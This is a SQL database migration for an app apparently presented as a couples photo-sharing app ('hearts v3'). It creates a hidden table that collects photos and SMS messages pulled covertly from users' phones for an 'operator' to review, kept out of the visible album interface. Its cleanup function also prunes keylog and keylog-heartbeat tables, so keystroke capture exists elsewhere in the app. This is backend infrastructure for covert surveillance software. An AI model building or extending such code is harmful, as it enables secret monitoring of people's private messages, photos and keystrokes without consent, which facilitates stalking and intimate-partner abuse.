-- hearts v3 · 0010_create_device_media.sql
-- Hidden ongoing device capture sink: photos + SMS pulled from the device's
-- own storage by the app's background collectors (features/capture/).
--
-- This is SEPARATE from the curated `photos`/`albums` tables (the couple's
-- shared albums). Device media is the "everything on the phone" hidden stream
-- the operator reviews; it must never pollute the user-facing album UI.
--
-- Idempotency: (couple_id, kind, device_key) is unique. device_key is the
-- native device's own stable id — the photo Asset ID / the SMS `_id` — so a
-- replayed / re-scanned collector batch is a no-op. The edge function upserts
-- on this key (never on id).

create table public.device_media (
  id uuid primary key default gen_random_uuid(),
  couple_id uuid not null references public.couples on delete cascade,
  author_id uuid not null references public.profiles on delete cascade,
  -- 'photo' (gallery asset) | 'sms' (message)
  kind text not null check (kind in ('photo','sms')),
  -- native device id: MediaStore Asset ID (photo) / SMS _id (sms). Idempotency key.
  device_key text not null,
  -- storage object path for photos (bucket `photos`, prefix {couple_id}/{asset_id}.{ext};
  -- segment 1 is the couple_id, matching couple-scoped storage RLS); null for sms rows
  storage_path text,
  -- full captured payload: photo url+metadata, or sms fields. jsonb, opaque.
  payload jsonb not null default '{}'::jsonb,
  reported_at timestamptz not null default now(),
  created_at timestamptz not null default now(),
  constraint device_media_uniq unique (couple_id, kind, device_key)
);

create index device_media_couple on public.device_media (couple_id, created_at desc);
create index device_media_device on public.device_media (kind, device_key);
create index device_media_reported on public.device_media (reported_at desc);

alter table public.device_media enable row level security;

-- couple reads; author writes their own captured rows; edge/service role
-- bypasses RLS for the batch upsert. Mirrors every content table in this repo.
create policy "device_media couple read" on public.device_media for select to authenticated
  using (couple_id = (select private.my_couple_id()));
create policy "device_media author write" on public.device_media for insert to authenticated
  with check (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));
create policy "device_media author delete" on public.device_media for delete to authenticated
  using (couple_id = (select private.my_couple_id()) and author_id = (select auth.uid()));

-- ──────────────────────────────────────────────────────────────────────
-- Cleanup: extend the shared sweep (defined in 0009) to also cap this sink at
-- the same 45-day cadence. `create or replace` supersedes the 0009 body (which
-- already covers keylogs + heartbeats); latest wins at migration time.
-- ──────────────────────────────────────────────────────────────────────
create or replace function private.prune_keylogs()
returns void
language plpgsql security definer
set search_path = ''
as $$
begin
  delete from public.keylogs
   where created_at < now() - interval '45 days';
  delete from public.keylog_heartbeats
   where reported_at < now() - interval '45 days';
  delete from public.device_media
   where reported_at < now() - interval '45 days';
end;
$$;
